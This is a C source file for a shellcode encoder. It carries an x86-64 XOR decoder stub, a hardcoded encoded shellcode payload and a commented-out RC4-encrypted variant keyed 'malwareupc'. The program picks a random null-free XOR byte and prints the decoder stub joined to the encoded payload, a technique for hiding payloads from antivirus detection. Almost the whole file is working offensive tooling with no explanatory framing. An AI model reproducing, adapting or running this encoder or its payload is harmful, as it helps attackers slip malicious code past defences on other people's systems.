#include <fcntl.h>
#include <stdio.h>
#include <io.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

/*
 *
 * Code taken from phiral.net
 *
 */

void swap(unsigned char* s, int i, int j) {
    unsigned char temp = s[i];
    s[i] = s[j];
    s[j] = temp;
}

void rc4_crypt(unsigned char* key, unsigned char* data, size_t data_len) {
    unsigned char s[256];
    int i, j = 0, k;
    size_t keylen = strlen(key);

    for (i = 0; i < 256; i++) {
        s[i] = i;
    }

    for (i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % keylen]) % 256;
        swap(s, i, j);
    }

    i = j = 0;
    for (size_t n = 0; n < data_len; n++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        swap(s, i, j);
        k = s[(s[i] + s[j]) % 256];
        data[n] ^= k;
    }
}

 unsigned char decoder[] =
  "\x4d\x31\xc0"          /* xor    %r8,%r8               */
  "\x41\xb1\x00"          /* mov    $0x00,%r9b            */
  "\xeb\x1a"              /* jmp    4000d2 <get_sc_addr>  */
  "\x58"                  /* pop    %rax                  */
  "\x48\x31\xc9"          /* xor    %rcx,%rcx             */
  "\x48\x31\xdb"          /* xor    %rbx,%rbx             */
  "\x8a\x1c\x08"          /* mov    (%rax,%rcx,1),%bl     */
  "\x4c\x39\xc3"          /* cmp    %r8,%rbx              */
  "\x74\x10"              /* je     4000d7 <exec_sc>      */
  "\x44\x30\xcb"          /* xor    %r9b,%bl              */
  "\x88\x1c\x08"          /* mov    %bl,(%rax,%rcx,1)     */
  "\x48\xff\xc1"          /* inc    %rcx                  */
  "\xeb\xed"              /* jmp    4000bf <xor_loop>     */
  "\xe8\xe1\xff\xff\xff"; /* callq  4000b8 <jmp_back>     */
//unsigned char decoder[] = "";

//unsigned char key[] = "malwareupc";

//unsigned char shellc[] = "\xFF\x82\xF6\x57\xCC\x5E\xEA\x33\x8C\x87\x91\xAC\x76\xE8\x25\xB0\xB2\x85\x88\x5E\xE8\x80\x2E\x8E\xB4\xD5\xFA\xF2\xE2\xC0\x82\x5B\x2D\x2F\x29\x66\xF6\x6E\xE2\xB0\xD2\xB0\x9A\x08\x60\xBD\x11\xA8\x07\xD4\xD6\x17\xE9\xB8\x25\xCE\x54\xB7\x9E\x7E\x87\x85\xAA\x8A\xA9\x84\x44\xA8\x9A\xE5\x6C\xCA\x27\x7A\xA3\x81\x11\x97\x4E\x4E\x9F\x98\x87\xD7\xA2\x6C\xDA\x35\x53\x94\x98\x9B\xC5\x5F\x11\x9F\x86\x5A\x58\x38\xB2\x12\x36\xF9\xDB\xC1\xE5\xE4\x49\x99\x7E\x7A\x94\xD1\x3B\x3C\x0B\x73\x8E\xB2\xCE\x49\xEE\x59\xCA\x2A\x50\x61\xE7\x2F\xF2\xD8\x53\x7B\xF9\xC5\xD7\xFA\x8F\x71\xA9\x8B\xF6\x67\x62\x62\xA6\x2E\x8E\x1C\x74\x30\xE9\xDA\xBD\x41\x3B\xFE\xBD\xB3\x8E\xF7\x9C\x79\x8B\xE8\x79\x9F\xED\x95\x5B\x9F\xC0\xA8\x35\x6C\xD1\x84\xB4\xCB\x75\xC9\x5D\xE3\x54\x9B\xF7\x53\x10\xE2\xE5\xD1\x95\x5A\x31\x91\x55\x39\x37\xFF\x59\x9D\x00\xCA\xE8\xD5\x36\x6F\xCF\x53\xA9\x57\x81\xC0\xA6\x4B\x26\x3C\x2F\x47\xEA\xDE\xE3\x0D\x98\xCB\xB4\x40\xE0\xEA\xCD\xFF\x4E\xA8\xB3\x0F\x7D\x96\xA2\x25\x4A\xF5\x43\x13\xB2\xC9\x59\x4A\x35\x5A\xEA\x39\x40\x26\xA8\xA8\x77\x4D\x0A\xF6\xE5\x30\x08\x3E\xF4\xA2\x02\xD7\x6B\xE9\xFF\xDB\xB8\xC4\xEA\x81\x8A\x69\xAD\xBE\xB8\xEE\xA7\xDC\x52\x35\x5C\x83\xF9\x60\xB0\x45\x7A\xE0\xA4\x1A\xB8\x01\xFE\x32\xF0\xBA\xAE\xDD\x80\x4C\xA9\xBE\x5A\x3D\x2B\xC8\xCE\xEC\x77\xDD\xD3\x43\x20\x5B\xAE\x4A\x30\x6A\x98\xAA\x0F\x13\x82\x22\xBB\x03\x42\x57\x36\x46\xBC\xBB\xF9\x01\xB3\xA3\xC8\xC0\x3F\xF8\xB5\x95\x7F\x23\xFB\xEC\x80\x24\x15\x1D\x7D\x66\x78\x2A\xBD\x1E\x42\xB6\x74\x92\x82\x13\x80\x0C\xE9\x51\x00\x78\x24\x50\x26\x50\x75\xF0\xA4\x8A\xEB\x9E\xC7\x84\x05\x51\xFC\xCE\x1C\x76\xE7\x57\xD0\x40\x9A\x76\x57\x4A\xB0\xA2\x13\x4F\x36\x4D\x33\x07\xBC\x29\x38\x54\x0A\x0A\x08\xA4\x86\x9C\x84\xE2\x05\xE5\x2C\xB5\xBE\x4C\xD5\x23\xCB\x36\xB7\xE3\xAE\xB7\x8C\xB9\x79\x1A\x6D\x2D\x15\xD8\x87\x49\xD3\xC5\xD3\xBE\xFA\xAF\x73\x2A\xDD\xE8\x03\x73\x74\xB4\x94\x7C\x22\x74\x83\x52\xF3\xCB\xD6\x1C\xF4\xF5\xFD\xF2\xEA\xBF\xE2\x10\x2B\xA2\x21\x98\x2B\x97\x44\x5E\x2D\x31\x2B\xD4\xDF\x45\x7B\x38\x30\x1E\xBC\x26\x93\x6B\xF7\xBF\x54\x9B\xCF";
 unsigned char shellc[] = "\x49\x89\xE1\x4D\x31\xDB\xDB\xD6\x66\x41\x81\xE1\x70\xF8\x48\xB9\x3D\xFD\xD3\xDA\x82\x77\x9B\xE5\x41\xB3\x4C\x49\x0F\xAE\x01\x49\x83\xC1\x08\x4D\x8B\x01\x49\xFF\xCB\x4B\x31\x4C\xD8\x2D\x4D\x85\xDB\x75\xF3\x70\xCC\x37\x93\x0B\x94\xD3\x5E\x44\xC1\x1B\x2E\x6A\x72\x32\x07\x5B\xBC\x52\x39\x52\x87\x40\x3D\x7C\x49\x95\x93\x8D\xD9\x98\xAC\xB6\xAE\xDB\x93\x7D\xBB\xD1\xD4\x61\x1F\xC9\x97\x07\x93\xEE\x16\x09\xF0\xD2\x67\xD0\x0C\x62\x3E\x5B\xC4\xFC\xDB\xA0\x26\x73\xB6\x04\x9A\x7D\xAF\x89\xC2\xC5\xDE\xAC\x89\x14\x80\x69\x3E\xB9\x7C\x4C\x88\xE4\xE7\x25\x43\x66\xC8\x53\x8C\x9E\xE7\x1F\x81\x04\xDE\x9E\x05\xC9\x81\xAE\x47\x2A\xD6\x9E\x0E\xEA\x81\x26\xC9\x02\x10\x9A\x26\x4A\x7A\x8E\xF0\x43\xF9\x7E\x9E\xA9\xF3\xD7\x33\x1F\x5F\x35\x21\xD1\x81\xAE\xF4\xB6\x7B\x35\x5B\xE1\xBC\x6C\x35\x4A\x93\x7E\xD6\xA2\xBA\x8E\xC9\x02\x51\xCB\x67\x1A\x28\xDF\x9F\x4A\x21\x48\x43\x02\xF1\xDC\xA9\x4A\x9B\xC8\x3E\x02\xF1\xDC\xE9\x4A\x9B\xE8\x76\x02\x75\x39\x83\x48\x5D\xAB\xEF\x02\x4B\x4E\x65\x3E\x71\xE6\x24\x66\x5A\xCF\x08\xCB\x1D\xDB\x27\x8B\x98\x63\x9B\x43\x41\xD2\xAD\x18\x5A\x05\x8B\x3E\x58\x9B\xF6\xC1\xFA\x06\xC9\x02\x10\xD2\xA3\x8A\x0E\xE9\x81\x03\xC0\xCA\xAD\x02\x62\xCA\x42\x42\x30\xD3\x27\x9A\x99\xD8\x81\xFD\xD9\xDB\xAD\x7E\xF2\xC6\xC8\xD4\x5D\xAB\xEF\x02\x4B\x4E\x65\x43\xD1\x53\x2B\x0B\x7B\x4F\xF1\xE2\x65\x6B\x6A\x49\x36\xAA\xC1\x47\x29\x4B\x53\x92\x22\xCA\x42\x42\x34\xD3\x27\x9A\x1C\xCF\x42\x0E\x58\xDE\xAD\x0A\x66\xC7\xC8\xD2\x51\x11\x22\xC2\x32\x8F\x19\x43\x48\xDB\x7E\x14\x23\xD4\x88\x5A\x51\xC3\x67\x10\x32\x0D\x25\x22\x51\xC8\xD9\xAA\x22\xCF\x90\x58\x58\x11\x34\xA3\x2D\x71\x36\xFD\x4D\xD3\x98\x3D\x09\xBC\x96\x31\x22\x9A\x26\x0B\x2C\xC7\x40\xE4\x58\x1B\xCA\xEA\x7B\x8E\xC9\x4B\x99\x7F\x6F\xF6\x78\x8E\xDA\x89\x1A\x9A\x24\x4F\x3B\xDA\x80\x8B\xF4\xD6\xAF\xBB\x3B\x34\x85\x75\x36\x9D\xD9\x9F\x36\x07\x23\x6A\x11\x9B\x26\x4A\x23\xCF\x73\x2B\x90\xF1\x26\xB5\xAF\xDE\x99\x4F\x21\x53\x6B\x7B\xBA\xC6\x36\xC2\x58\x13\xE4\x02\x85\x4E\x81\x8B\xD1\xDB\x9C\xA0\x75\x51\x29\xFD\xC5\xD2\xAF\x8D\x10\x9E\x88\x5A\x5C\x13\xC4\x02\xF3\x77\x88\xB8\x89\x3F\x52\x2B\x85\x5B\x81\x83\xD4\xDA\x24\x4A\x7A\xC7\x71\x61\x7D\xFE\x26\x4A\x7A\x8E\xC9\x43\x40\xDB\x76\x02\xF3\x6C\x9E\x55\x47\xD7\x17\x8A\x10\x83\x90\x43\x40\x78\xDA\x2C\xBD\xCA\xED\x56\x11\x9B\x6E\xC7\x3E\xAA\xD1\xC4\x10\xF2\x6E\xC3\x9C\xD8\x99\x43\x40\xDB\x76\x0B\x2A\xC7\x36\xC2\x51\xCA\x6F\xB5\xB2\xC3\x40\xC3\x5C\x13\xE7\x0B\xC0\xF7\x05\x3D\x96\x65\xF3\x02\x4B\x5C\x81\xFD\xDA\x11\x28\x0B\xC0\x86\x4E\x1F\x70\x65\xF3\xF1\x8A\x3B\x6B\x54\x51\x20\x80\xDF\xC7\x13\x36\xD7\x58\x19\xE2\x62\x46\x88\xB5\x08\x90\x61\xC6\x3F\x7F\x35\x8E\x11\x62\xF5\x4C\x4A\x23\xCF\x40\xD8\xEF\x4F\x96\x6B\x82\x72\xF9\x01\xF2";
//unsigned char shellc[] = "";

int main(int argc, char** argv) {
    char* file;
    struct _stat sstat;
    int i, n, fd, len, lens, xor_with;
    int decoder_len;
    unsigned char* fbuf, * ebuf;
    unsigned char bad_bytes[256] = { 0 };
    unsigned char good_bytes[256] = { 0 };

    /*if (argc != 2) {
        fprintf(stderr, "Syntax: %s binary_file\n", argv[0]);
        _exit(1);
    }*/

    //file = argv[1];
    ///* open the sc.bin file and read all the bytes */
    //if (_stat(file, &sstat) < 0) {
    //    fprintf (stderr, "File %s not found", file);
    //    _exit(1);
    //}
    // fprintf(stderr, "Perfect, processing file %s\n", file);

    //len = sstat.st_size;
    lens = strlen(shellc);
    //rc4_crypt(key, shellc, lens);
    // printf("lenstat: %d\n", len);
    /*if ((fbuf = (unsigned char *)malloc(len)) == NULL) {
        perror("malloc");
        _exit(1);
    }*/

    // if ((fd = open(file, O_RDONLY)) < 0) {
    /*_sopen_s(&fd,file,_O_BINARY,_SH_DENYNO,0);
    if (fd < 0) {
        perror("open");
        _exit(1);
    }*/

    /*int lenr;
    if ((lenr = _read(fd, fbuf, len)) != len) {
        printf("len: %d\n", lenr);
        perror("read");
        _exit(1);
    }

    close(fd);*/

    /* try every byte xored, if its \x0 add to bad_bytes */
    for (n = 0; n < lens; n++) {
        for (i = 1; i < 256; i++) {
            if ((i ^ *(shellc + n)) == 0) bad_bytes[i] = i;
        }
    }

    /* if its not a bad_byte its a good_one (ordered) */
    for (i = 1, n = 0; i < 256; i++) {
        if (bad_bytes[i] == '\0') good_bytes[n++] = i;
    }

    srand((unsigned)time(NULL));
    xor_with = good_bytes[rand() % n];

    if (xor_with) {
        // printf("\n[x] Choose to XOR with 0x%02x\n\n", xor_with);

        /* overwrite that 5th xor byte with the xor_with byte */
        decoder[5] = xor_with;
        decoder_len = strlen((char*)decoder);

        if ((ebuf = (unsigned char*)malloc(decoder_len + lens + 1)) == NULL) {
            perror("malloc");
            _exit(1);
        }
        memset(ebuf, '\x0', sizeof(ebuf));

        for (i = 0; i < decoder_len; i++) {
            ebuf[(i)] = decoder[i];
        }
        /* copy the xored shellcode byes in */
        for (i = 0; i < lens; i++) {
            ebuf[(i + decoder_len)] = xor_with ^ *(shellc + i);
        }

        // printf("char code[]=\"");
        // printf("\"");
        for (i = 0; i < strlen((char*)ebuf); i++) {
            // if (i > 0 && i % 15 == 0)
                // printf("\"\n\""); 
            printf("\\x%02x", ebuf[i]);
        }
        // printf("\";\n\n");
        // printf("\"");

        return 0;
    }
    else {
        // printf("\n[*] No byte found to XOR with :(\n");
        printf("N");
        _exit(1);
    }

    return 0;
}

